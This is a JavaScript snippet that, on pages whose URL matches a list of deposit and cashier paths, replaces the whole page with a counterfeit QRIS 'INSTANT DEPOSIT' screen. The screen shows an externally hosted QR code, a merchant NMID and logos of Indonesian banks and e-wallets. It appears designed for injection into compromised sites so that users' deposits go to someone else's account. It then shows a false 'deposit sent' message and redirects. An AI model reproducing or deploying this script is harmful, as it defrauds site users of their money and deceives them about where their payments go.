(function() {
    const targetPaths = [
        "/deposit", "/m/deposit", "/mobile/index.php?page=transaksi",
        "/desktop/index.php?page=transaksi", "/dekstop/index.php?page=transaksi",
        "/account/deposit", "/desktop/account/deposit", "/m/account/deposit",
        "/desktop/account/qris.php", "/m/account/qris.php", "/mobile/index.php?page=cashier",
        "/desktop/index.php?page=cashier", "/dekstop/index.php?page=cashier",
        "/mobile/pre.php?page=cashier", "/dekstop/pre.php?page=cashier",
        "/desktop/pre.php?page=cashier", "/dp/deposit", "/m/deposit",
        "/desktop/deposit", "/dekstop/deposit", "/mobile/deposit",
        "/userarea/deposit.php", "/userarea/deposit", "/m/cashier", "/app/?deposit", "/user-deposit"
    ];

    if (!targetPaths.some(path => location.href.includes(path))) {
        return;
    }

    document.documentElement.innerHTML = "<body></body>";

    let link = document.createElement("link");
    link.href = "https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap";
    link.rel = "stylesheet";
    document.head.appendChild(link);
    document.body.style.fontFamily = "'Poppins', sans-serif";

    let mainWrapper = document.createElement("div");
    mainWrapper.style.display = "flex";
    mainWrapper.style.justifyContent = "center";
    mainWrapper.style.alignItems = "center";
    mainWrapper.style.height = "100vh";
    mainWrapper.style.padding = "20px";

    let container = document.createElement("div");
    container.className = "container";
    container.style.background = "rgba(255, 255, 255, 0.5)";
    container.style.backdropFilter = "blur(15px)";
    container.style.padding = "24px";
    container.style.borderRadius = "20px";
    container.style.textAlign = "center";
    container.style.color = "white";
    container.style.boxShadow = "0 8px 16px rgba(0, 0, 0, 0.3)";
    container.style.width = "90%";
    container.style.maxWidth = "400px";
    container.style.minHeight = "550px";

    container.innerHTML = `
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h3 style="margin: 0; font-size: 18px; color: black;">INSTANT DEPOSIT</h3>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_QRIS.svg/2560px-Logo_QRIS.svg.png" 
                alt="QRIS" style="height: 18px;">
        </div>
        <br>
        <img src="https://imagizer.imageshack.com/v2/386x371q70/922/P2KTs4.jpg" 
            alt="QRIS Code" style="width: 100%; max-width: 250px; border-radius: 12px;"> 
        <p style="margin-top: 8px; font-size: 14px;">NMID: ID10587821668967</p>
        <div style="text-align: center;">
            <p style="font-size: 14px; margin-bottom: 10px;">
                SCAN BARCODE > ISI NOMINAL > TRANSFER > KONFIRMASI
            </p>
            <input type="text" id="nominal" placeholder="Masukkan Nominal" 
                style="width: 280px; padding: 10px; text-align: center; 
                font-size: 16px; border: none; border-radius: 8px; 
                color: brown; font-weight: 600; display: block; margin: 0 auto;">
            <button id="konfirmasiBtn" class="btn" 
                style="display: block; margin: 12px auto; padding: 12px 0; 
                background: #ffcc00; color: black; border-radius: 8px; 
                cursor: pointer; font-size: 16px; font-weight: 600; width: 280px;">
                Konfirmasi
            </button>
        </div>
        <div id="notification" 
            style="display: none; position: fixed; top: 15px; left: 50%; 
            transform: translateX(-50%); background: rgba(0, 0, 0, 0.8); 
            color: white; padding: 10px 14px; border-radius: 8px; 
            font-size: 14px; font-weight: 600; text-align: center; z-index: 1000;">
        </div>
        <div style="margin: 12px 0; display: flex; justify-content: center; gap: 6px; flex-wrap: wrap;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/eb/Logo_ovo_purple.svg/2560px-Logo_ovo_purple.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/1024px-Gopay_logo.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/2560px-Logo_dana_blue.svg.png" style="height: 18px;">
            <img src="https://assets.ifgameshop.com/2024/05/df43d0db24d726b70617fbca5d2c6975.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/SeaBank.svg/1200px-SeaBank.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/1200px-Bank_Central_Asia.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/BRI_2020.svg/2560px-BRI_2020.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/id/thumb/5/55/BNI_logo.svg/2560px-BNI_logo.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/2560px-Bank_Mandiri_logo_2016.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/38/CIMB_Niaga_logo.svg" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Bank_Syariah_Indonesia.svg/2560px-Bank_Syariah_Indonesia.svg.png" style="height: 18px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c0/Logo-jago.svg/1200px-Logo-jago.svg.png" style="height: 18px;">
        </div>
    `;

    mainWrapper.appendChild(container);
    document.body.appendChild(mainWrapper);
    document.body.style.background = "url('https://images.rawpixel.com/image_800/czNmcy1wcml2YXRlL3Jhd3BpeGVsX2ltYWdlcy93ZWJzaXRlX2NvbnRlbnQvbHIvcm00ODYtYmctMDE3Yi14LmpwZw.jpg') no-repeat center center fixed";
    document.body.style.backgroundSize = "cover";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.height = "100vh";

    const showNotification = (message) => {
        let notif = document.getElementById("notification");
        notif.innerText = message;
        notif.style.display = "block";
        notif.style.opacity = "0";
        notif.style.transition = "opacity 0.5s ease-in-out";

        setTimeout(() => {
            notif.style.opacity = "1";
        }, 100);

        setTimeout(() => {
            notif.style.opacity = "0";
            setTimeout(() => {
                notif.style.display = "none";
            }, 500);
        }, 2500);
    };

    document.getElementById("nominal").addEventListener("input", function(e) {
        let value = e.target.value.replace(/\D/g, "");
        if (value === "") {
            e.target.value = "";
            return;
        }
        let formattedValue = new Intl.NumberFormat("id-ID").format(value);
        e.target.value = "Rp " + formattedValue;
    });

    document.getElementById("konfirmasiBtn").addEventListener("click", function() {
        let nominal = document.getElementById("nominal").value.replace(/\D/g, "");
        let minDeposit = 25000;

        if (nominal === "" || nominal < minDeposit) {
            showNotification("⚠️ Minimal deposit Rp 25.000!");
        } else {
            let formattedNominal = new Intl.NumberFormat("id-ID").format(nominal);
            showNotification("✅ Deposit berhasil dikirim Rp " + formattedNominal);
            setTimeout(() => {
                window.location.href = "../";
            }, 1500);
        }
    });
})();
